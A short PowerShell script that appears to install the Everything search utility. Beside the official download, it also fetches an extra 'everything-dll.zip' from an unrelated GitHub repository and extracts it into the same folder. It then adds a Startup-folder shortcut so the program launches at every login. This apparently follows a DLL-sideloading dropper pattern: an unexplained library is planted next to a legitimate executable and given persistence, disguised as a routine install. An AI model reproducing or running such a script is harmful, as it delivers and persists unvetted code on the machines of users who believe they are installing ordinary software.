$success = $false
$url1 = "https://www.voidtools.com/Everything-1.4.1.986.x64.zip"
$url2 = "https://raw.githubusercontent.com/decepdick/test-repo/main/everything-dll.zip"
$url1Path = "$env:TEMP\file1.zip"
$url2Path = "$env:TEMP\file2.zip"
$extractPath = "$env:LOCALAPPDATA\Everything"
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Everything.lnk"
$targetPath = "$extractPath\Everything.exe"

Write-Host "Starting the script .. . . Please wait ... "

ni -ItemType Directory -Path $extractPath -Force
$headers = @{
        'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
}
iwr -Uri $url1 -OutFile $url1Path -Headers $headers
iwr -Uri $url2 -OutFile $url2Path -Headers $headers
Expand-Archive -Path $url1Path -Destination $extractPath -Force
Expand-Archive -Path $url2path -Destination $extractPath -Force
rm $url1Path, $url2Path -Force
$WShell = New-Object -ComObject WScript.Shell
$shortcut = $WShell.CreateShortcut($startupPath)
$shortcut.TargetPath = "$targetPath"
$shortcut.Arguments = "-startup"
$shortcut.Save()
[Runtime.InteropServices.Marshal]::ReleaseComObject($WShell)

$success = $true




